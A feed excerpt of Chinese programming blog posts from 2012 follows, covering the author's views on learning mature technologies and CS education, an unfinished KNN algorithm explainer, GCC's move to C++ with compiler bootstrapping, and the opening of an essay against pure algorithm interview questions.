<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%AF%B9%E4%BA%8E%E6%97%A5%E6%96%B0%E6%9C%88%E5%BC%82%E7%9A%84%E6%96%B0%E6%8A%80%E6%9C%AF%EF%BC%8C%E4%BD%A0%E6%98%AF%E4%BB%80%E4%B9%88%E6%80%81%E5%BA%A6%EF%BC%9F" title="对于日新月异的新技术，你是什么态度？">对于日新月异的新技术，你是什么态度？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%8F%AF%E6%98%AF%E5%9C%A8%E5%BA%94%E7%94%A8%E7%8E%AF%E5%A2%83%E4%B8%AD%EF%BC%8C%E5%AF%B9%E6%96%B0%E6%8A%80%E6%9C%AF%E7%9A%84%E9%9C%80%E6%B1%82%E6%98%AF%E5%BE%88%E9%AB%98%E7%9A%84%EF%BC%8C%E4%BD%A0%E8%A7%89%E5%BE%97%E5%9C%A8%E6%95%99%E8%82%B2%E9%A2%86%E5%9F%9F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E7%9A%84%E4%BE%A7%E9%87%8D%E5%BA%94%E8%AF%A5%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%EF%BC%9F" title="可是在应用环境中，对新技术的需求是很高的，你觉得在教育领域计算机科学的侧重应该是什么样的？">可是在应用环境中，对新技术的需求是很高的，你觉得在教育领域计算机科学的侧重应该是什么样的？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E9%82%A3%E4%B9%88%EF%BC%8C%E7%8E%B0%E5%9C%A8%E5%81%9A%E4%B8%80%E4%B8%AA%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E8%80%85%E6%98%AF%E5%90%A6%E6%9B%B4%E5%8A%A0%E5%9B%B0%E9%9A%BE%E4%BA%86%EF%BC%9F" title="那么，现在做一个软件开发者是否更加困难了？">那么，现在做一个软件开发者是否更加困难了？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%BD%A0%E5%A6%82%E4%BD%95%E5%9C%A8%E8%BF%9B%E5%BA%A6%E5%8E%8B%E5%8A%9B%E4%B8%8B%EF%BC%8C%E4%BA%AB%E5%8F%97%E6%8A%80%E6%9C%AF%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%BF%AB%E4%B9%90%EF%BC%9F" title="你如何在进度压力下，享受技术带来的快乐？">你如何在进度压力下，享受技术带来的快乐？</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%AF%B9%E4%BA%8E%E6%97%A5%E6%96%B0%E6%9C%88%E5%BC%82%E7%9A%84%E6%96%B0%E6%8A%80%E6%9C%AF%EF%BC%8C%E4%BD%A0%E6%98%AF%E4%BB%80%E4%B9%88%E6%80%81%E5%BA%A6%EF%BC%9F"></span>对于日新月异的新技术，你是什么态度？<span class="ez-toc-section-end"></span>
</h4>
<p>遇到新技术我会去了解，但不会把很大的精力放在这些技术（如：NoSQL，Node.js，等）。这些技术尚不成熟，只需要跟得住就可以了。技术十年以上可能是一个门槛。有人说技术更新换代很快，我一点儿都不觉得是这样想。虽然有不成熟的技术不断地涌出，但是成熟的技术，比如Unix，40多年，C，40多年，C++，30多年，TCP/IP，20多年，Java也有将近20年了……，所以，如果你着眼成熟的技术，其实并不多。</p>
<p>我的观点是——<strong>要了解技术就一定需要了解整个计算机的技术历史发展和进化路线。</strong>（这个观点，我在《<a title="程序员技术练级攻略" href="https://coolshell.cn/articles/4990.html" target="_blank">程序员练级攻略</a>》和《<a title="C++的坑真的多吗？" href="https://coolshell.cn/articles/7992.html" target="_blank">C++的坑多吗？</a>》中提到过多次了。）因为，<strong>你要朝着球运动的轨迹去，而不是朝着球的位置去，要知道球的运动轨迹，你就需要知道它历史上是怎么跑的</strong>。</p>
<p>如果要捋一个技术的脉络，70年代Unix的出现，是软件发展方面的一个里程碑，那个时期的C语言，也是语言方面的里程碑。（当时）所有的项目都在Unix/C上，全世界人都在用这两样东西写软件。Linux跟随的是Unix, Windows下的开发也是 C/C++。这时候出现的C++很自然就被大家接受了，企业级的系统很自然就会迁移到这上面，C++虽然接过了C的接力棒，但是它的问题是它没有一个企业方面的架构，而且太随意了，否则也不会有今天的Java。C++和C非常接近，它只不过是C的一个扩展，长年没有一个企业架构的框架。而Java在被发明后，被IBM把企业架构这部分的需求接了过来，J2EE的出现让C/C++捉襟见肘了，在语言进化上，还有Python/Ruby，后面还有了.NET，但可惜的是这只局限在Windows平台上。这些就是企业级软件方面语言层面就是C -&gt; C++ -&gt; Java这条主干，操作系统是Unix -&gt; Linux/Windows这条主干，软件开发中需要了解的网络知识就是Ethernet -&gt; IP -&gt; TCP/UDP 这条主干。另外一条脉络就是互联网方面的（HTML/CSS/JS/LAMP…）。我是一个有技术忧虑症的人，这几条软件开发的主线一定不能放弃。</p>
<p>另外，从架构上来说，我们可以看到，</p>
<p><span id="more-8088"></span></p>
<ul>
<li>从单机的年代，到C/S架构（界面，业务逻辑，数据SQL都在Client上，只有数据库服库在S上）</li>
<li>再到B/S结构（用浏览器来充当Client，但是传统的ASP/PHP/JSP/Perl/CGI这样的编程也都把界面，业务逻辑，和SQL都放在一起），但是B/S已经把这些东西放到了Web Server上，</li>
<li>再到后来的中间件，把业务逻辑再抽出一层，放到一个叫App Server上，经典的三层结构。</li>
<li>然后再到分布式结构，业务层分布式，数据层分布式。</li>
<li>再到今天的云架构——全部移到服务器。</li>
</ul>
<div>我们可以看到技术的变迁都一直再把东西往后端移，前端只剩一个浏览器或是一个手机。通过这个你可以看到整个技术发展的趋势。所以，如果你了解了这些变迁，了解了这些变迁过程“不断填坑”的过程，你将会对技术有很强的把握。</div>
<p>另外，我听到有很多人说，一些技术不适用，一些技术太学院派，但对我来说，无论是应用还是学术，我都会看，知识不愁多。何必搞应用的和搞学术的分开阵营，都是知识，学就好了。</p>
<p>技术的发展要根植于历史，而不是未来。不要和我描述这个技术的未来会多么美好（InfoQ 的 ArchSummit大会上有一个微软来的人把Node.js说得跟仙女一样，然后给了一个Hello World），我承认你用一些新的技术可以实现很多花哨的东西。但是，我认为技术都是承前的，只有承前的才会常青。所以说“某某（技术）要火”这样的话是没有意义的，等它火了、应用多了，规模大了，再说。有些人说：“不学C/C++也是没有问题的”，我对此的回应是：<strong>如果连技术主干都可以不学的话，还有什么其他的好学呢？这些是计算机发展的根、脉络、祖师爷，这样的东西怎么可以不学呢？</strong></p>
<p><strong></strong>另外，我们要去了解整个计算机文化，我觉得计算机文化源起于Unix/C这条线上（注意，我说的是文化不是技术）。我也写过很多与Unix文化相关的文章，大家可以看看我写的“<a title="Unix传奇(上篇)" href="https://coolshell.cn/articles/2322.html" target="_blank">Unix传奇</a>（<a title="Unix传奇(下篇)" href="https://coolshell.cn/articles/2324.html" target="_blank">尤其是下篇</a>）”。</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%AF%E6%98%AF%E5%9C%A8%E5%BA%94%E7%94%A8%E7%8E%AF%E5%A2%83%E4%B8%AD%EF%BC%8C%E5%AF%B9%E6%96%B0%E6%8A%80%E6%9C%AF%E7%9A%84%E9%9C%80%E6%B1%82%E6%98%AF%E5%BE%88%E9%AB%98%E7%9A%84%EF%BC%8C%E4%BD%A0%E8%A7%89%E5%BE%97%E5%9C%A8%E6%95%99%E8%82%B2%E9%A2%86%E5%9F%9F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E7%9A%84%E4%BE%A7%E9%87%8D%E5%BA%94%E8%AF%A5%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%EF%BC%9F"></span>可是在应用环境中，对新技术的需求是很高的，你觉得在教育领域计算机科学的侧重应该是什么样的？<span class="ez-toc-section-end"></span>
</h4>
<p>学校教的大部分都是知识密集型的技术，但是社会上的企业大部分都是劳动密集型的。什么是劳动密集型的企业呢？麦当劳炸薯条就是劳动密集型的工作，用不到学校教授的那些知识。如果有一天你不炸薯条了，而要去做更大更专业的东西，学校里的知识就会派上用场。有人说一个语言、一个技术，能解决问题能用就行了，我不这样认为。<strong>我觉得你应该至少要知道这些演变和进化的过程。而如果你要解决一些业务和技术难题，就需要抓住某种技术很深入地学习，当成艺术一样来学习。</strong></p>
<p>我在“<a title="软件开发的“三重门”" href="https://coolshell.cn/articles/6526.html" target="_blank">软件开发‘三重门’</a>”里说过，第一重门是业务功能，在这重门里，的确是会编程就可以了；第二重门是业务性能，在这一重门里，技术的基础就很管用了，比如：操作系统的文件管理，进程调度，内存管理，网络的七层模型，TCP/<del>UCP</del>UDP的协议，语言用法、编译和类库的实现，数据结构，算法等等就非常关键了；第三重门是业务智能，在这一重门里，你会发现很多东西都很学院派了，比如，搜索算法，推荐算法，预测，统计，机器学习，图像识别，分布式架构和算法，等等，你需要读很多计算机学院派的论文。</p>
<p>总之，这主要看你职业生涯的背景了，如果你整天被当作劳动力来使用，你用到的技术就比较浅，比较实用，但是如果你做一些知识密集型的工作，你就需要用心来搞搞研究，就会发现你需要理论上的知识。比如说，我之前做过的跨国库存调配，需要知道最短路径的算法，而我现在在亚马逊做的库存预测系统，数据挖掘的那些东西都需要很强的数学建模、算法、数据挖掘的功底。</p>
<p>我觉得真正的高手都来自知识密集型的学院派。他们更强的是，可以把那些理论的基础知识应用到现在的业务上来。但很可惜，<strong>我们国内今天的教育并没有很好地把那些学院派的理论知识和现实的业务问题很好地接合起来。</strong>比如说一些哈希表或二叉树的数据结构，如果我们的学校在讲述这些知识的时候能够接合实际的业务问题，效果会非常不错，如：设计一个IP地址和地理位置的查询系统，设计一个分布式的NoSQL的数据库，或是设计一个地理位置的检索应用等等。在学习操作系统的时候，如果老师可以带学生做一个手机或嵌入式操作系统，或是研究一下Unix System V或是Linux的源码的话，会更有意思。在学习网络知识的时候，能带学生重点学一下以太网和TCP/IP的特性，并调优，如果能做一个网络上的pub/sub的消息系统或是做一个像Nginx一样的web server，那会更好。如果在学图形学的过程中能带领学生实践一个作图工具或是一个游戏引擎，那会更有意思。</p>
<p>总之，我们的教育和现实脱节太严重了，教的东西无论是在技术还是在实践上都严重落后和脱节，没有通过实际的业务或技术问题来教学生那些理论知识，这是一个失败。</p>
<h4>
<span class="ez-toc-section" id="%E9%82%A3%E4%B9%88%EF%BC%8C%E7%8E%B0%E5%9C%A8%E5%81%9A%E4%B8%80%E4%B8%AA%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E8%80%85%E6%98%AF%E5%90%A6%E6%9B%B4%E5%8A%A0%E5%9B%B0%E9%9A%BE%E4%BA%86%EF%BC%9F"></span><strong>那么，现在做一个软件开发者是否更加困难了？</strong><span class="ez-toc-section-end"></span>
</h4>
<p>我觉得倒不是。做一个软件开发者更简单了。因为现在互联网很发达，你可以找到很多共享的知识——相对于我那个时候。第一，知识你容易查到，然后社区很多，文章、分享的人也越来越多。我们那个时候没有的。上网一查，什么都没有。都得去自己琢磨，自己去调查。所以我觉得相比我们那个时候更容易了。第二，工具变多了。现在的工具比那个时候好用多了。我们那个时候就是一天到晚在vi里面，连个自动提示都没有，连个版本库管理都没有。不光工具变多，框架也多了，各种各样的编程框架。我们那时候都是生写。写JavaScript，生写，连个jQuery都没有。没有这些辅助性的、让你提高生产力的东西。J2EE那时候也没有。而且整个（开发环境）都很不成熟。一个服务器的最高配置就1GB的情况下，一个WebSphere起来就占了900多MB——这还能跑什么应用？所以只能去用最基础的系统。所以我觉得现在，无论是环境，还是开发的过程，都更规范了。以前我做开发的时候就是，什么都不懂就上了，瞎搞，没有什么开发规范，没有人理你，反正你搞得好就搞好，搞不好就搞不好了，全靠自己，包括做测试维护等等。我觉得现在的软件开发就很好，你一上去，就有好的工具，有好的知识库，有好的社区，有好的开发框架，还有好的流程，方法，甚至还有人帮你做测试，还有人告诉你应该怎么做。幸福得很。现在好多人还说这个不好那个不好，开发难什么的。其实容易多了。</p>
<p>但是，有个东西我觉得是现在的软件开发者比我们那时候变得更难的。就是，你享福了以后，人就变懒，变娇气了。对很多东西的抱怨就开始多了。我们那个时候哪有什么好抱怨的？没啥好抱怨的，有活就干，有东西学就赶快学。现在呢，学个什么东西还挑挑拣拣的，抱怨这个语言太扯，那个IDE不好，这个框架太差，版本管理工具太扯，等等。<strong>这就好像以前我没东西吃，只有个糠吃，要是有面包有馒头，我就觉得非常非常好了。现在是，好吃的东西多了我们还学会挑食了，这也不好用，那也不好用</strong>。</p>
<p>根本就不是技术变难了，环境变差了，是程序员变娇气了。所以软件开发变难，归根结底还是程序员们自己变娇气了。</p>
<h4>
<span class="ez-toc-section" id="%E4%BD%A0%E5%A6%82%E4%BD%95%E5%9C%A8%E8%BF%9B%E5%BA%A6%E5%8E%8B%E5%8A%9B%E4%B8%8B%EF%BC%8C%E4%BA%AB%E5%8F%97%E6%8A%80%E6%9C%AF%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%BF%AB%E4%B9%90%EF%BC%9F"></span>你如何在进度压力下，享受技术带来的快乐？<span class="ez-toc-section-end"></span>
</h4>
<p>中国人中庸的思想，入世和出世，每天的工作就是入世。举个例子，我十年前在上海的时候，给交通银行做项目的时候，每周休息一天，早九点到晚十点，每天工作12个小时，这样的工作持续了一整年，没有节假日，项目上的技术也没什么意思。当时我晚上十点回到住处，还想学一些C++/Java和Unix/Windows的技术，于是就看书到晚上11:30，每天如此，一年下来学到很多东西，时间没有荒废，心里就很开心。<strong>我觉得当时是快乐的，因为有成长的感觉是快乐的。</strong></p>
<p>现在的我，工作、写博客、养孩子，事情其实更多。我早上7:30起床，会浏览一下国外的新闻，hacker news, tech church, reddit, highavailability之类的站点，9点上班。晚上6、7点钟下班，开始带孩子。十点钟孩子睡了觉，我会开始重新细读一下这一天都发生了些什么事情。这个时间也有可能会用来看书。学习的过程（我）是不喜欢被打断的，所以从十点到十二点，家人都睡了，这正是我连续学习的好时间。可能从晚上11:30开始，我会做点笔记或者写博客。我现在对酷壳文章的质量要求比较高一些，所以大概积累一个星期的时间才可以生成一篇文章。每天我大概都在一两点钟才会睡觉。没办法，我有技术焦虑症。但是觉得这样的生活很充实，也很踏实。</p>
<p>另外，任何一门技术玩深了，都是很有意思的。有些人形成了一个价值取向，“我只做什么，绝不做什么”。前段时间有一个刚来亚马逊的工程师，他原来做的是数据挖掘推荐系统，原来的公司重组要让他做前端，他不肯就离职了，他说他不想做前端。我觉得，前端后端都是编程，Javascript是编程，C++也是编程。<strong>编程不在于你用什么语言去coding，而是你组织程序、设计软件的能力，只要你上升到脑力劳动上来，用什么都一样，技术无贵贱。</strong>你可以不喜欢那个技术，但是还是要了解了解，也没有必要完全不用，完全抛弃。Javascript啊——只要能被Javascript实现的，未来总有一天会被Javascript所取代。</p>
<p>回到问题，怎么才能享受到快乐呢？</p>
<ul>
<li>第一，入世和出世要分开，不要让世俗的东西打扰到你的内心世界，你的情绪不应该为别人所控，也不应该被世俗所污染，活得真实，活得真实你才会快乐。</li>
</ul>
<ul>
<li>第二，就是要有热情，有了热情，你的心情就会很好，加班都可以是快乐的，想一想我们整个通宵用来打游戏的时光，虽然很累，但是你也很开心，这都是因为有了热情的缘故。</li>
</ul>
<p>总之一句话——<strong>如果你没有兴趣，什么都是借口，如果你有兴趣了，什么都是好玩的</strong>。</p>
<h4></h4>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-08-16T23:50:25+08:00</pubDate>
<guid>https://coolshell.cn/articles/8088.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ K Nearest Neighbor 算法 ]]></title>
<link>https://coolshell.cn/articles/8052.html</link>
<content><![CDATA[ 
<p>K Nearest Neighbor算法又叫KNN算法，这个算法是机器学习里面一个比较经典的算法， 总体来说KNN算法是相对比较容易理解的算法。其中的K表示最接近自己的K个数据样本。KNN算法和<a title="K-Means 算法" href="https://coolshell.cn/articles/7779.html" target="_blank">K-Means算法</a>不同的是，K-Means算法用来聚类，用来判断哪些东西是一个比较相近的类型，而KNN算法是用来做归类的，也就是说，有一个样本空间里的样本分成很几个类型，然后，给定一个待分类的数据，通过计算接近自己最近的K个样本来判断这个待分类数据属于哪个分类。<strong>你可以简单的理解为由那离自己最近的K个点来投票决定待分类数据归为哪一类</strong>。</p>
<p style="text-align: left;">Wikipedia上的<a href="https://en.wikipedia.org/wiki/K-nearest_neighbor_algorithm" target="_blank">KNN词条</a>中有一个比较经典的图如下：</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;">从上图中我们可以看到，图中的有两个类型的样本数据，一类是蓝色的正方形，另一类是红色的三角形。而那个绿色的圆形是我们待分类的数据。</p>
<ul>
<li>如果K=3，那么离绿色点最近的有2个红色三角形和1个蓝色的正方形，这3个点投票，于是绿色的这个待分类点属于红色的三角形。</li>
</ul>
<ul>
<li>如果K=5，那么离绿色点最近的有2个红色三角形和3个蓝色的正方形，这5个点投票，于是绿色的这个待分类点属于蓝色的正方形。</li>
</ul>
<p>我们可以看到，机器学习的本质——<strong>是基于一种数据统计的方法</strong>！那么，这个算法有什么用呢？我们来看几个示例。</p>
<p><span id="more-8052"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BA%A7%E5%93%81%E8%B4%A8%E9%87%8F%E5%88%A4%E6%96%AD" title="产品质量判断">产品质量判断</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E9%A2%84%E6%B5%8B" title="预测">预测</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%8F%92%E5%80%BC%EF%BC%8C%E5%B9%B3%E6%BB%91%E6%9B%B2%E7%BA%BF" title="插值，平滑曲线">插值，平滑曲线</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%90%8E%E8%AE%B0" title="后记">后记</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BA%A7%E5%93%81%E8%B4%A8%E9%87%8F%E5%88%A4%E6%96%AD"></span>产品质量判断<span class="ez-toc-section-end"></span>
</h4>
<p>假设我们需要判断纸巾的品质好坏，纸巾的品质好坏可以抽像出两个向量，一个是“酸腐蚀的时间”，一个是“能承受的压强”。如果我们的样本空间如下：（所谓样本空间，又叫Training Data，也就是用于机器学习的数据）</p>
<table style="margin: auto;" border="1" cellspacing="3" cellpadding="3">
<tbody>
<tr>
<td valign="top" width="33%">
 ]]></content>
<pubDate>2012-08-17T08:15:30+08:00</pubDate>
<guid>https://coolshell.cn/articles/8052.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ GCC 用 C++ 来编译 ]]></title>
<link>https://coolshell.cn/articles/8115.html</link>
<content><![CDATA[ 
<p>GCC在2012年8月15日的时候，merge了一个patch – <a href="https://gcc.gnu.org/git/?p=gcc.git;a=commitdiff;h=2b15d2ba7eb3a25dfb15a7300f4ee7a141ee8539" target="_blank">Merge from cxx-conversion branch</a>，这意味着，以后在GCC的编译只能用C++的编译器了，也意味着，gcc的实现代码开始转向C++了。</p>
<p>你可能会有两个问题，</p>
<ul>
<li>一个问题是为什么GCC要转成C++的实现？</li>
</ul>
<ul>
<li>没有C++的编译器，我怎么编译C++编译器的代码？这不是“鸡生蛋还是蛋生鸡”的问题么？</li>
</ul>
<p>那，我们来看一看吧。</p>
<h4>为什么要用C++</h4>
<p>在<a href="https://gcc.gnu.org/wiki/cxx-conversion" target="_blank">GNU的C++ Conversion文档</a>中，我们可以在Background中看到这样的描述：</p>
<blockquote><p>Whether we use C or C++, we need to try to ensure that interfaces are easy to understand, that the code is reasonably modular, that the internal documentation corresponds to the code, that it is possible for new developers to write new passes and to fix bugs. Those are the important issues for us to consider. The C++ features which are not present in C — features which are well documented in many books and many web sites — are not an important issue.</p></blockquote>
<p>这句话的意思可以理解为，今天GCC在用C语言的实现已经有点hold不住了，因为，开发人员觉得，不管我们用C或C++，都需要努力确保接口是容易理解的，这样我们的代码是想当理性地被模块化的，这样内部文档和代码一致，这样可以更好地组织代码，这样有利于新人了fix-bug。而C++正好可以让他们更好的完成这些东西。</p>
<p>GNU还给出了下面这些理由：</p>
<p><span id="more-8115"></span></p>
<ul>
<li>C++ 是一种标准化的，大众的，流行的语言。</li>
<li>C++ 是C90的超集。</li>
<li>C++作为C的扩展和C在性能上一样好。</li>
<li>C++ 在一些有意义的案例上支持更干净的代码。</li>
<li>C++ 让你更容易去写一个更干净的接口。</li>
<li>C++ 永远不会让你的代码变得更丑。</li>
<li>C++ 不是万灵药，他是C的一个改进。</li>
</ul>
<p>然后，给了一个PDF <a href="https://airs.com/ian/cxx-slides.pdf">http://airs.com/ian/cxx-slides.pdf</a>，这是Google 的<a href="https://airs.com/ian/" target="_blank"> Ian Lance Taylor</a>的的一个PPT，这个文档可以让大家更好地理解我在《<a title="C++的坑真的多吗？" href="https://coolshell.cn/articles/7992.html" target="_blank">C++的坑多吗？</a>》一文中那些观点。<strong>我都不知道我要说多少遍C++的封装，继承和多态比C语言在代码组织上要好得多得多</strong>。大家还是自己看一下代码吧：</p>
<p><strong><span style="color: #800000;">数据结构的操作</span> —— </strong>你写的一定不会有STL好</p>
<p style="padding-left: 30px;"><strong><a href="https://coolshell.cn/wp-content/uploads/2012/08/VEC-vs-vector.jpg"><img alt="image placeholder" ></a></strong></p>
<p><span style="color: #800000;"><strong>结构套结构还是继承？</strong></span></p>
<p style="padding-left: 30px;"><a href="https://coolshell.cn/wp-content/uploads/2012/08/tree-structure.jpg"><img alt="image placeholder" ></a></p>
<p><span style="color: #800000;"><strong>函数指针还是多态？</strong></span></p>
<div style="padding-left: 30px;"><a href="https://coolshell.cn/wp-content/uploads/2012/08/TARGET-vs-Target.jpg"><img alt="image placeholder" ></a></div>
<p><span style="color: #800000;"><strong>垃圾回收 还是 智能指针？</strong></span></p>
<div style="padding-left: 30px;"><a href="https://coolshell.cn/wp-content/uploads/2012/08/GC-vs-Smart-Pointer.jpg"><img alt="image placeholder" ></a></div>
<p><span style="color: #800000;"><strong>Why not C++? </strong></span></p>
<ul>
<li>
<strong>C++慢吗</strong>？某些特性会慢，但是有时C++更快，你可以只用你喜欢的C++特性。</li>
<li>
<strong>C++复杂吗？</strong>它只不过是另一种编程语言，他可以让你对程序员维护更简单。</li>
<li>
<strong>FSF不喜欢C++！</strong>因为FSF（自由软件基金会）这些人不写代码。</li>
</ul>
<p><a href="https://coolshell.cn/wp-content/uploads/2012/08/Why-not-C++.jpg"><img alt="image placeholder" ></a></p>
<div></div>
<h4>Bootstrapping</h4>
<p>最后，我想来介绍一下<a href="https://en.wikipedia.org/wiki/Bootstrapping_%28compilers%29" target="_blank">Bootstrapping</a>。 所谓Bootstrapping，就是用自己这个语言写编译器来编译自己，也就是说如果你要编译gcc，你需要用一个c的编译器来编译之，这个就是bootstrapped process，自举过程。包括 <a title="BASIC" href="https://en.wikipedia.org/wiki/BASIC">BASIC</a>, <a title="Algol" href="https://en.wikipedia.org/wiki/Algol">Algol</a>, <a title="C (programming language)" href="https://en.wikipedia.org/wiki/C_(programming_language)">C</a>, <a title="C++" href="https://en.wikipedia.org/wiki/C%2B%2B">C++</a>, <a title="Pascal programming language" href="https://en.wikipedia.org/wiki/Pascal_programming_language">Pascal</a>, <a title="PL/I" href="https://en.wikipedia.org/wiki/PL/I">PL/I</a>, <a title="Factor programming language" href="https://en.wikipedia.org/wiki/Factor_programming_language">Factor</a>, <a title="Haskell (programming language)" href="https://en.wikipedia.org/wiki/Haskell_(programming_language)">Haskell</a>, <a title="Modula-2" href="https://en.wikipedia.org/wiki/Modula-2">Modula-2</a>, <a title="Oberon programming language" href="https://en.wikipedia.org/wiki/Oberon_programming_language">Oberon</a>, <a title="OCaml" href="https://en.wikipedia.org/wiki/OCaml">OCaml</a>,<a title="Common Lisp" href="https://en.wikipedia.org/wiki/Common_Lisp">Common Lisp</a>, <a title="Scheme (programming language)" href="https://en.wikipedia.org/wiki/Scheme_(programming_language)">Scheme</a>, <a title="Java (programming language)" href="https://en.wikipedia.org/wiki/Java_(programming_language)">Java</a>, <a title="Python (programming language)" href="https://en.wikipedia.org/wiki/Python_(programming_language)">Python</a>, <a title="Scala (programming language)" href="https://en.wikipedia.org/wiki/Scala_(programming_language)">Scala</a> 等语言都这么干。</p>
<p>这样干的好处主要是，自己可以测试自己，编译器的改善和语言的改善相辅相成。</p>
<p>但是，这是一个“鸡生蛋，还是蛋生鸡”的问题，如果你需要用X语言来写一个X语言编译器的语言，你可以这样干：</p>
<ul>
<li>用Y语言来实现X的语言解释器或编译器。 <a title="Niklaus Wirth" href="https://en.wikipedia.org/wiki/Niklaus_Wirth">Niklaus Wirth</a> 说 <a title="Pascal programming language" href="https://en.wikipedia.org/wiki/Pascal_programming_language">Pascal</a> 的第一个编译器是由 <a title="Fortran" href="https://en.wikipedia.org/wiki/Fortran">Fortran</a> 写的。</li>
<li>已存在用Y语言写的X语言的编译器或解释器。<a title="Scheme (programming language)" href="https://en.wikipedia.org/wiki/Scheme_(programming_language)">Scheme</a> 就是这么干的。</li>
<li>已经有一个编译器来编译一个早期版本的X语言，然后就可以用早期版本的X语言来编译新版本的X语言了。<a title="Java (programming language)" href="https://en.wikipedia.org/wiki/Java_(programming_language)">Java</a>，<a title="Haskell (programming language)" href="https://en.wikipedia.org/wiki/Haskell_(programming_language)">Haskell</a>, 和最初版的 <a title="Free Pascal" href="https://en.wikipedia.org/wiki/Free_Pascal">Free Pascal</a> 就是这么干的。</li>
<li>X在某平台上的编译器已经存在，可以使用交叉编译技术来编译另一个平台上X语言，C语言就是这么干的。</li>
<li>用X语言写一个编译器，然后手动编译之（不需要特别优化），（注：手动编译估计就是手动翻译成机器汇编代码），然后再运行这个手动编译的编译器来编译这个编译器的源码，并优化之。<a title="Donald Knuth" href="https://en.wikipedia.org/wiki/Donald_Knuth">Donald Knuth</a> 在他的 <a title="WEB" href="https://en.wikipedia.org/wiki/WEB">WEB</a> <a title="Literate programming" href="https://en.wikipedia.org/wiki/Literate_programming">literate programming</a> 系统里用到了这个方法。</li>
</ul>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-08-20T08:40:04+08:00</pubDate>
<guid>https://coolshell.cn/articles/8115.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 为什么我反对纯算法面试题 ]]></title>
<link>https://coolshell.cn/articles/8138.html</link>
<content><![CDATA[ 
<p>算法面试可能是微软搞出来的面试方法，现在很多公司都在效仿，而且我们的程序员也乐于解算法题，我个人以为，这是应试教育的毒瘤！我在《<a title="再谈“我是怎么招聘程序员的”（上）" href="https://coolshell.cn/articles/4506.html">再谈“我是怎么招程序员”</a>》中比较保守地说过，“<strong>问难的算法题并没有错，错的很多面试官只是在肤浅甚至错误地理解着面试算法题的目的</strong>。”，今天，我想加强一下这个观点——<strong>我反对纯算法题面试</strong>！（注意，我说的是纯算法题）</p>
<figure id="attachment_8140" aria-describedby="caption-attachment-8140" style="width: 250px" class="wp-caption alignright"><a href="https://en.wikipedia.org/wiki/Sheldon_Cooper"><img alt="image placeholder" ></a><figcaption id="caption-attachment-8140" class="wp-caption-text">图片源Wikipedia（点击图片查看词条）</figcaption></figure>
<p>我再次引用我以前的一个观点——</p>
<p style="padding-left: 30px;">能解算法题并不意味着这个人就有能力就能在工作中解决问题，你可以想想，小学奥数题可能比这些题更难，但并不意味着那些奥数能手就能解决实际问题。</p>
<p>好了，让我们来看一个示例（这个示例是昨天在<a href="https://weibo.com/1401880315/yy9pvgNi2" target="_blank">微博上的一个讨论</a>），这个题是——“<strong>找出无序数组中第2大的数</strong>”，几乎所有的人都用了O(n)的算法，我相信对于我们这些应试教育出来的人来说，不用排序用O(n)算法是很正常的事，连我都不由自主地认为O(n)算法是这个题的标准答案。<strong>我们太习惯于标准答案了，这是我国教育最悲哀的地方</strong>。（广义的洗脑就是让你的意识依赖于某个标准答案，然后通过给你标准答案让你不会思考而控制你）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%8A%9F%E8%83%BD%E6%80%A7%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90" title="功能性需求分析">功能性需求分析</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E9%9D%9E%E5%8A%9F%E8%83%BD%E6%80%A7%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90" title="非功能性需求分析">非功能性需求分析</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%B7%A5%E7%A8%8B%E5%BC%8F%E7%9A%84%E8%A7%A3%E6%B3%95" title="工程式的解法">工程式的解法</a></li>
